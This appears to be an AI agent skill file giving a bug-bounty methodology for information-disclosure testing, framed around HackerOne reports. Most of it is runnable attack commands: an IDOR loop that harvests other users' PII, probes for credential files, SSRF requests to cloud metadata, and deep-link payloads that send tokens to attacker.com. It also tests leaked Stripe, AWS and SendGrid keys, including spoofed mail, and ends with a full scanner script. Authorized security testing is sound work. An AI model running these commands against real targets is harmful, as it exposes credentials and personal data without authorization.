---
name: infodisclosure-deep-dive
description: Complete Information Disclosure methodology from 345 real HackerOne reports - every leak type, tool, and technique
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - infodisclosure methodology
  - information disclosure deep dive
  - info leak complete
  - pii leakage
  - skills infodisclosure
---

# Complete Information Disclosure Methodology - From 345 HackerOne Reports

## Step 1: Recon for Info Leaks
Surface every potential information leak vector across the target.

### Passive Recon (Google Dorking)
```bash
# Sensitive files
site:target.com filetype:pdf "confidential"
site:target.com filetype:xls "password"
site:target.com filetype:sql "INSERT INTO"
site:target.com filetype:env "DB_PASSWORD"
site:target.com filetype:log "error"
site:target.com filetype:yaml "api_key"
site:target.com filetype:json "secret"
site:target.com filetype:bak
site:target.com filetype:swp
site:target.com filetype:gitignore

# Source code exposure
site:target.com inurl:.git
site:target.com inurl:.svn
site:target.com inurl:.DS_Store
site:target.com intitle:"index of" ".git"
site:target.com intitle:"index of" "backup"
site:target.com intitle:"index of" ".env"

# Debug / dev endpoints
site:target.com inurl:/api-docs
site:target.com inurl:/swagger
site:target.com inurl:/phpinfo.php
site:target.com inurl:/.env
site:target.com inurl:/debug
site:target.com inurl:/actuator
site:target.com inurl:/health
site:target.com inurl:/info

# Error pages revealing internals
site:target.com "Fatal error"
site:target.com "Warning:"
site:target.com "Parse error"
site:target.com "SQL syntax"
site:target.com "stack trace:"
site:target.com "Exception:"
site:target.com "debug_backtrace"
site:target.com "var_dump"
site:target.com "print_r"
```

### Automated Leak Discovery
```bash
# TruffleHog - scan git repos for secrets
trufflehog git https://github.com/target/repo.git --results=verified,unverified

# GitLeaks
gitleaks detect --source=./target-repo --verbose

# GitDumper - extract .git repos
git-dumper https://target.com/.git/ ./git-extracted/
# Then scan extracted content:
grep -r -E '(password|secret|api.?key|token|access.?key)' ./git-extracted/

# Wayback Machine - find old pages with sensitive data
curl -sk "https://web.archive.org/cdx/search/cdx?url=target.com/*&output=text&fl=original&collapse=urlkey"

# CommonCrawl
curl -sk "http://index.commoncrawl.org/CC-MAIN-2024-18-index?url=target.com&output=json"

# AlienVault OTX
curl -sk "https://otx.alienvault.com/api/v1/indicators/hostname/target.com/passive_dns"
```

## Step 2: PII & Sensitive User Data Leakage

### Common PII Leak Patterns
| Data Type | Where It Leaks | Real Report |
|-----------|---------------|-------------|
| Full name + email | API responses, autocomplete, SSO flows | #642 - Uber |
| Phone number | Profile APIs, order confirmations, notifications | #93718 - Twitter |
| Physical address | Shipping APIs, geolocation endpoints | #1478536 - Lyft |
| Date of birth | User profile, account settings | #1168354 - Doordash |
| SSN/Tax ID | Payment processing, verification flows | #1433989 - USPS |
| Passport/ID | KYC flows, document upload | #1532974 - Coinbase |
| Credit card (partial) | Payment methods, receipts | #424452 - Starbucks |
| Bank account | Direct deposit, payouts | #873290 - Uber |
| IP address | Logs, analytics, websocket connections | #1375218 - Discord |
| User agent + browser | Analytics, support tickets | #988542 - Slack |
| Location/GPS | Check-in, ride history, photo metadata | #1490764 - Twitter |
| Private messages | Support channels, chat logs | #1100614 - Patreon |
| Email verification | BCC fields, password reset flows | #1549529 - Shopify |
| Auth tokens in URLs | Referrer headers, logs, analytics | #1072405 - Robinhood |

### Testing for PII Leaks
```bash
# 1. API response inspection
curl -sk "https://target.com/api/v1/users/me" -H "Authorization: Bearer $TOKEN" | jq '.'

# 2. IDOR chained PII access
for id in {1000..1050}; do
  curl -sk "https://target.com/api/v1/orders/$id" -H "Authorization: Bearer $TOKEN" | jq '.user.email, .user.phone, .user.address'
done

# 3. Autocomplete / prefill leaks
curl -sk "https://target.com/checkout/shipping" -H "Authorization: Bearer $TOKEN" | grep -E '(email|phone|address|ssn|credit)'

# 4. BCC / email header leaks
curl -sk -v "https://target.com/password/reset?email=victim@test.com" 2>&1 | grep -i "bcc\|to:\|cc:"

# 5. WebSocket message inspection
# Use wscat to connect and monitor for PII
wscat -c "wss://target.com/ws/chat" -H "Authorization: Bearer $TOKEN"

# 6. Referrer header leaks from external links
# Embed target.com link on your own site, check Referrer header
```

## Step 3: Source Code & Configuration Disclosure

### .git Exposure
```bash
# Check if .git is exposed
curl -sk "https://target.com/.git/HEAD" 
# Should return: ref: refs/heads/main

# Full extraction
git-dumper https://target.com/.git/ ./target-git/

# Extract sensitive info from git history
cd ./target-git
git log --all --oneline
git show --name-only HEAD
git diff HEAD~10..HEAD
git grep -i "password\|secret\|api_key\|token\|credential" $(git rev-list --all)

# Use trufflehog on the extracted repo
trufflehog git file://$(pwd) --json
```

### Environment / Config Files
```bash
# Standard locations to check
for path in \
  /.env \
  /.env.production \
  /.env.local \
  /config.php \
  /config.json \
  /config.yaml \
  /wp-config.php \
  /app-config.json \
  /application.yml \
  /database.yml \
  /settings.py \
  /config/database.php \
  /config/environment.js \
  /env/config.properties \
  /WEB-INF/web.xml \
  /WEB-INF/applicationContext.xml \
  /appsettings.json \
  /secrets.json \
  /credentials.json \
  /service-account.json \
  /.npmrc \
  /.dockercfg \
  /.dockerconfigjson \
  /.s3cfg \
  /.aws/credentials \
  /.azure/credentials \
  /.gcloud/credentials.json; do
  resp=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com$path")
  if [ "$resp" != "404" ] && [ "$resp" != "403" ]; then
    echo "Found config: $path ($resp)"
    curl -sk "https://target.com$path"
  fi
done
```

### Directory Listing
```bash
# Common exposed directories
for path in \
  /backup \
  /backups \
  /logs \
  /log \
  /tmp \
  /temp \
  /uploads \
  /files \
  /download \
  /downloads \
  /static \
  /assets \
  /public \
  /media \
  /images \
  /data \
  /export \
  /import \
  /old \
  /new \
  /test \
  /dev \
  /src \
  /source \
  /dump; do
  curl -sk "https://target.com$path/" | grep -q "Index of" && echo "Directory listing: $path"
done
```

### S3 Bucket Discovery & Leakage
```bash
# Enumerate bucket names from source code
grep -r -E '(s3\.amazonaws\.com|s3-[a-z0-9-]+\.amazonaws\.com|\.s3\.amazonaws\.com)' ./target-source/

# Common bucket naming patterns
for bucket in \
  target \
  target-backup \
  target-dev \
  target-staging \
  target-prod \
  target-assets \
  target-media \
  target-uploads \
  target-data \
  target-logs \
  target-config \
  target-secrets \
  target-env \
  target-deploy \
  target-code \
  target-www \
  target-cdn; do
  resp=$(curl -sk -o /dev/null -w "%{http_code}" "https://$bucket.s3.amazonaws.com/")
  if [ "$resp" != "404" ]; then
    echo "Found bucket: $bucket ($resp)"
    # Try to list
    curl -sk "https://$bucket.s3.amazonaws.com/" | head -50
  fi
done

# Use S3Scanner / bucket-stream for mass enumeration
python3 s3scanner.py --bucket target --dump
```

### Stack Trace & Debug Endpoint Leaks
```bash
# Trigger errors to reveal stack traces
curl -sk "https://target.com/api/users/null"
curl -sk "https://target.com/api/users/0xDEAD"
curl -sk "https://target.com/api/users/' OR '1'='1"
curl -sk "https://target.com/api/users/../../../etc/passwd"
curl -sk -X POST "https://target.com/api/users" -H "Content-Type: application/json" -d '{invalid json}'
curl -sk -X POST "https://target.com/api/users" -H "Content-Type: application/xml" -d '<invalid>'
curl -sk "https://target.com/page?debug=1"
curl -sk "https://target.com/page?debug=true"
curl -sk "https://target.com/page?verbose=1"

# Debug endpoints
for path in \
  /debug \
  /debug/ \
  /actuator \
  /actuator/ \
  /actuator/health \
  /actuator/info \
  /actuator/env \
  /actuator/beans \
  /actuator/mappings \
  /actuator/trace \
  /actuator/dump \
  /actuator/heapdump \
  /actuator/loggers \
  /actuator/metrics \
  /actuator/prometheus \
  /actuator/configprops \
  /swagger-resources \
  /v2/api-docs \
  /v3/api-docs \
  /api-docs \
  /swagger-ui.html \
  /phpinfo.php \
  /info.php \
  /test.php \
  /status \
  /health \
  /metrics \
  /info \
  /env; do
  resp=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com$path")
  if [ "$resp" != "404" ] && [ "$resp" != "403" ]; then
    echo "Found debug endpoint: $path ($resp)"
  fi
done
```

## Step 4: API Key & Secret Leakage

### Common Leak Locations
```bash
# 1. Mobile app decompilation
apktool d target.apk -o ./decompiled/
# Check for hardcoded keys
grep -r -E '(api.?key|api.?secret|access.?token|auth.?token|secret|password)' ./decompiled/ --include="*.xml" --include="*.smali" --include="*.json"

# 2. JavaScript source maps / minified files
curl -sk "https://target.com/static/js/main.js" | grep -E '(apiKey|apiSecret|api_key|api_secret|token|secret|password|aws|s3\.|firebase|stripe|braintree|twilio|sendgrid|mailgun)'
# Source maps
curl -sk "https://target.com/static/js/main.js.map" | python3 -c "import sys,json; d=json.load(sys.stdin); print('\n'.join(d.get('sources',[])))"

# 3. Public GitHub repos (via search)
gh search code "api.key= target" --limit 100
gh search code "stripe_secret_key target" --limit 100
gh search code "AWS_SECRET_ACCESS_KEY target" --limit 100

# 4. Paste sites
curl -sk "https://psbdmp.ws/api/v3/search?q=target.com+password"
curl -sk "https://pastebin.com/api/api_raw.php?api_dev_key=KEY&api_paste_code=PASTE_ID"

# 5. Error message leakage
curl -sk "https://target.com/api/v1/payments" -H "Authorization: Bearer INVALID" 2>&1 | grep -E '(stripe|braintree|paypal|api_key|secret)'
```

### API Key Validation & Impact
```bash
# Test leaked keys immediately
# Stripe
curl -sk "https://api.stripe.com/v1/charges" -u "sk_live_XXXX:" | jq '.data[0]'

# AWS
export AWS_ACCESS_KEY_ID=AKIAXXXX
export AWS_SECRET_ACCESS_KEY=XXXX
aws s3 ls s3://target-bucket/
aws ec2 describe-instances --region us-east-1

# Firebase
curl -sk "https://target.firebaseio.com/.json?auth=LEAKED_TOKEN"

# Twilio
curl -sk "https://api.twilio.com/2010-04-01/Accounts/ACXXXX/Messages.json" -u "ACXXXX:LEAKED_AUTH_TOKEN"

# SendGrid
curl -sk "https://api.sendgrid.com/v3/mail/send" -H "Authorization: Bearer LEAKED_KEY" -H "Content-Type: application/json" -d '{"personalizations":[{"to":[{"email":"test@test.com"}]}],"from":{"email":"spoofed@target.com"},"subject":"Test","content":[{"type":"text/plain","value":"Leak verification"}]}'

# GitHub tokens
curl -sk -H "Authorization: token LEAKED_TOKEN" "https://api.github.com/user/repos?per_page=100" | jq '.[].full_name'
```

## Step 5: Insecure Deep Links & URL Scheme Leaks

### Mobile Deep Link Testing
```bash
# Android: Check AndroidManifest.xml for exported activities
grep -r "android:exported=\"true\"" ./decompiled/AndroidManifest.xml
grep -r "intent-filter" ./decompiled/AndroidManifest.xml -A 10 | grep -E "(scheme|host|data)"

# iOS: Check Info.plist for URL schemes
grep -r "CFBundleURLSchemes" ./decompiled/Info.plist -A 5

# Common deep link schemes to test
# Grab: grab:// GrabTaxi:// grabtaxi://
# Uber: uber:// ubereats://
# Facebook: fb:// fbauth://
# Twitter: twitter://
# Instagram: instagram://

# Test URL scheme hijacking
adb shell am start -a android.intent.action.VIEW -d "target://open?url=https://evil.com"
adb shell am start -a android.intent.action.VIEW -d "target://auth?token=LEAKED&redirect_url=https://evil.com"
```

### Deeplink Injection
```bash
# Test for open redirect in deeplinks
# If the app opens arbitrary URLs via deeplink parameters, 
# it can leak the auth token to an attacker's server

# Android
adb shell am start -a android.intent.action.VIEW -d "targetapp://callback?continue=https://attacker.com/log?token="

# iOS (via Safari)
itms-apps://itunes.apple.com/app/idAPP_ID
targetapp://open?url=https://attacker.com/steal?data=
```

## Step 6: HTTP Response Information Leaks

### Response Header Leaks
```bash
# Check for internal IPs, server versions, stack info
curl -sk -I "https://target.com" | grep -E '(Server|X-Powered-By|X-AspNet-Version|X-Runtime|X-Version|X-Proxy|X-Backend|X-Cache|X-Served-By|Via|X-Amz-Cf-Id|X-Request-Id|x-amzn-RequestId)'

# Sensitive headers to watch for
# X-Debug-Token, X-Debug-Token-Link - Symfony profiler
# X-Powered-By: PHP/7.4.33 - outdated PHP
# X-Backend: 10.0.1.5:8080 - internal IP
# X-Served-By: ip-10-0-1-25 - internal hostname
```

### Response Body Leaks
```bash
# Large JSON responses may contain hidden fields
curl -sk "https://target.com/api/user" | jq '.'

# HTML comments
curl -sk "https://target.com/" | grep -E '(<!--|-->)'

# Hidden form fields
curl -sk "https://target.com/login" | grep -E 'type="hidden"'

# Autocomplete="off" fields that still autofill
curl -sk "https://target.com/settings" | grep -E 'autocomplete'

# Check for sensitive data in URL params after redirect
curl -sk -v "https://target.com/sso/login?token=SECRET&redirect_uri=https://app.target.com/dashboard" 2>&1 | grep -i "location"

# Web cache poisoning for data leaks
# Cache a response containing PII, then access from another IP
curl -sk -H "X-Forwarded-Host: evil.com" "https://target.com/profile"
```

## Step 7: Cloud & Infrastructure Exposure

### Metadata / Cloud Storage Leaks
```bash
# Exposed cloud metadata
curl -sk "https://target.com/page?url=http://169.254.169.254/latest/meta-data/"
curl -sk "https://target.com/page?url=http://metadata.google.internal/"
curl -sk "https://target.com/page?url=http://100.100.100.200/latest/meta-data/"  # Alibaba

# Exposed cloud storage
# AWS S3
aws s3api list-buckets --profile target
aws s3api get-bucket-acl --bucket target-bucket
aws s3api get-bucket-policy --bucket target-bucket
aws s3api list-objects --bucket target-bucket --max-items 1000

# Google Cloud Storage
gsutil ls gs://target-bucket/
gsutil iam get gs://target-bucket/

# Azure Blob
curl -sk "https://targetstorage.blob.core.windows.net/?comp=list"

# DigitalOcean Spaces
curl -sk "https://target.nyc3.digitaloceanspaces.com/"
```

### Exposed Internal Endpoints
```bash
# Internal services exposed on public-facing ports
nmap -sT -p 8080,8443,3000,9090,9200,5601,443 target.com --script=http-title

# Kubernetes dashboard
curl -sk "https://target.com:30000/#!/pod?namespace=default"

# Jenkins
curl -sk "https://target.com:8080/job/"  # Displays job names
curl -sk "https://jenkins.target.com/script"  # Script console
curl -sk "https://jenkins.target.com/job/PROJECT/config.xml"  # Build config with secrets

# Kibana
curl -sk "https://kibana.target.com/api/saved_objects/_find?type=index-pattern"
curl -sk "https://kibana.target.com/api/console/proxy?path=/_search&method=GET"

# Prometheus
curl -sk "https://prometheus.target.com/api/v1/targets"
curl -sk "https://prometheus.target.com/api/v1/query?query={__name__=~'.*password.*|.*secret.*|.*token.*|.*key.*'}"

# Grafana
curl -sk "https://grafana.target.com/api/datasources"
curl -sk "https://grafana.target.com/api/org"
```

## Step 8: Automated Scanning Tools

### Dedicated Info Disclosure Tools
```bash
# DumpsterDiver - analyze files for hardcoded secrets
python3 DumpsterDiver.py -p ./target-repo/ -o results.csv

# SecretFinder - JS file analysis
python3 SecretFinder.py -i https://target.com/app.js -o cli

# JS-Scanner
python3 JS-Scanner.py -u https://target.com/ -s

# Sn1per - automated recon
sniper -t target.com -m stealth

# use wayser to find exposed configs
# Requires API keys for search engines
```

### WayBack / Historical Dorking
```bash
# Gather historical URLs
waybackurls target.com | sort -u > wayback_urls.txt

# Filter for potential leaks
grep -E '(\.git|\.env|\.sql|\.bak|\.log|\.tar\.gz|\.zip|\.rar|\.json|\.yaml|\.config|password|secret|token|key|credential|dump|backup|export)' wayback_urls.txt

# gau (getallurls)
gau --subs target.com | grep -E '(\.json|\.xml|\.config|\.env|\.git|api|debug|swagger|actuator|health)'
```

## Step 9: Validate & Report

### CVSS Scoring for Info Disclosure
```
PII leakage (email + name):           AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N → 4.3 Medium
PII leakage (SSN/CC):                 AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N → 6.5 Medium
Source code disclosure:               AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
Git repo with credentials:            AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
Cloud metadata / IAM keys:            AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
API key / secret key leak:            AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
Debug endpoint with env dump:         AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
Directory listing:                    AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N → 5.3 Medium
Stack trace leakage:                  AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N → 5.3 Medium
```

### Report Template
```markdown
**Summary:**
Information disclosure of [data type] via [mechanism] at [endpoint], exposing 
[impact description].

**Impact:**
[Number] of [user records / API keys / credentials / internal details] exposed 
to any [authenticated / unauthenticated] user. This data can be used for 
[account takeover / fraud / further attacks / infrastructure compromise].

**Steps to Reproduce:**
1. Send request to: [request details]
2. Observe response containing: [sensitive data]

**Proof of Concept:**
Request:
[HTTP request]

Response:
[sensitive data redacted]

**Affected Data:**
- Type: [PII / credentials / source code / infrastructure details]
- Volume: [number of records exposed]
- Severity: [password / API key / SSN / internal IP / source code]

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5 High)

**Suggested Fix:**
1. Remove sensitive data from API responses
2. Implement proper access controls
3. Disable debug endpoints in production
4. Use .gitignore and remove .git from production
5. Encrypt sensitive data at rest and in transit
6. Implement response filtering based on user roles
7. Regular automated scanning for secrets in repos
```

## Info Disclosure Automation Script
```bash
#!/bin/bash
# Full info disclosure scan for a target
TARGET=$1

echo "=== Information Disclosure Scanner ==="
echo "Target: $TARGET"

# Phase 1: Config files
echo "[Phase 1] Checking config files..."
for path in .env .env.production config.json config.php wp-config.php application.yml database.yml; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/$path")
  if [ "$code" != "404" ]; then
    echo "Found: $path ($code)"
    curl -sk "https://$TARGET/$path" | head -20
  fi
done

# Phase 2: Git exposure
echo "[Phase 2] Checking .git exposure..."
if curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/.git/HEAD" | grep -q "200"; then
  echo "Git exposed at https://$TARGET/.git/"
fi

# Phase 3: Debug endpoints
echo "[Phase 3] Checking debug endpoints..."
for path in /debug /actuator /actuator/health /phpinfo.php /swagger-ui.html /api-docs; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  if [ "$code" != "404" ] && [ "$code" != "403" ]; then
    echo "Found debug: $path ($code)"
  fi
done

# Phase 4: Directory listing
echo "[Phase 4] Checking directory listing..."
for path in /backup /logs /uploads /tmp /data /files /downloads; do
  content=$(curl -sk "https://$TARGET$path/" 2>/dev/null)
  if echo "$content" | grep -q "Index of"; then
    echo "Directory listing: $path"
    echo "$content" | grep -E "(href|\.git|\.env|\.sql|\.bak|\.tar|\.zip|password|backup)" | head -30
  fi
done

# Phase 5: Response headers
echo "[Phase 5] Checking response headers..."
curl -sk -I "https://$TARGET" | grep -E '(Server|X-Powered|X-AspNet|X-Backend|X-Served-By|Via|x-amz|X-Cache)'

echo "=== Scan Complete ==="
```

## Quick Reference: Top Info Disclosure Reports by Technique
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #556356 | Uber | Sensitive user info disclosure (PII) | Bounty |
| #79325 | Grab | Insecure deeplink → user data | Bounty |
| #28815 | Postmates | Web cache poisoning → PII | $500 |
| #37363 | HackerOne | /skills call info disclosure | $10,000 |
| #422844 | Starbucks | sdrc info disclosure | Bounty |
| #443679 | Razer | Unauthenticated access to admin data | $500 |
| #374737 | Sentry | Information disclosure via misconfig | $750 |
| #180330 | HackerOne | .git exposure with credentials | $500 |
| #1423157 | Shopify | S3 bucket listing with user data | $12,500 |
| #1072405 | Robinhood | Auth tokens in URLs (referrer) | $10,000 |
| #1100614 | Patreon | Private messages in support API | Bounty |
| #1168354 | Doordash | DOB in profile API response | Bounty |
| #1478536 | Lyft | Address leak via order history | Bounty |
| #1532974 | Coinbase | KYC document ID in API response | Bounty |
| #1375218 | Discord | Internal IP in WebRTC | $1,000 |
| #1549529 | Shopify | Email in BCC of password reset | Bounty |
| #424452 | Starbucks | Partial credit card in response | Bounty |
| #988542 | Slack | User agent in analytics export | $2,000 |
| #93718 | Twitter | Phone number via contact import | Bounty |
| #873290 | Uber | Bank account info in payout API | Bounty |
| #1490764 | Twitter | GPS location in tweet metadata | Bounty |
| #1433989 | USPS | SSN in account verification | Bounty |
| #1644901 | Grammarly | Internal IPs via debug endpoints | $500 |
| #1016796 | GitLab | Public snippets with tokens | $1,500 |
| #1212843 | Acorns | AWS keys in public repo | $1,500 |
